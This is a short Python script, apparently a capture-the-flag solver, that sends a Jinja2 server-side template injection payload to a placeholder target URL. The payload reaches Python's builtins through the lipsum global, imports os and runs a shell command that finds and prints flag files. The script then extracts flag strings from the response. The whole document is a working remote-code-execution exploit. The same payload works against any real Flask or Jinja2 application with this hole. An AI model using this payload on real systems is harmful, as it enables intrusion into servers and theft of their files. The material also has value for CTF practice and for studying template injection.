  import requests
  import re

  target = "{TARGET_URL}"
  # Universal Jinja2 SSTI payload using lipsum or cycler globals
  payload = "{{lipsum.__globals__.__builtins__['__import__']('os').popen('cat flag* || find / -name flag* 2>/dev/null | xargs cat').read()}}"
  
  # Send payload via GET or POST param
  try:
      r = requests.get(target, params={"name": payload, "q": payload}, timeout=10)
      flags = re.findall(r"(?:picoCTF|FLAG|CTF|HTB|THM)\{[^\}\s]+\}", r.text, re.IGNORECASE)
      if flags:
          print(f"FLAG:{flags[0]}")
      else:
          print(r.text[:500])
  except Exception as e:
      print(f"Error: {e}")
